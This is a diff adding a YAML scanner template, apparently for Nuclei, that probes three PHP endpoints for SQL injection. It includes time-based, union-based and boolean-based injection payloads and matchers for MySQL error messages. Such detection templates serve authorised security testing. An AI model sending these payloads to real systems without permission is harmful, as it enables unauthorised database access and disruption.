@@ -1,0 +1,28 @@
+id: sql-injection-advanced
+info:
+  name: Advanced SQL Injection Detection
+  author: nghia
+  severity: critical
+  description: Detects SQL Injection vulnerabilities using advanced payloads.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: sqli, injection, time-based, union-based, boolean-based
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/listproducts.php?cat={{payload}}"
+      - "{{BaseURL}}/search.php?test={{payload}}"
+      - "{{BaseURL}}/artists.php?artist={{payload}}"
+    payloads:
+      payload:
+        - "1' OR SLEEP(10)--"
+        - "1' UNION SELECT 1,2,3--"
+        - "1' AND 1=1--"
+        - "1' AND 1=2--"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "near '.*(SLEEP|UNION|AND).*' at line"
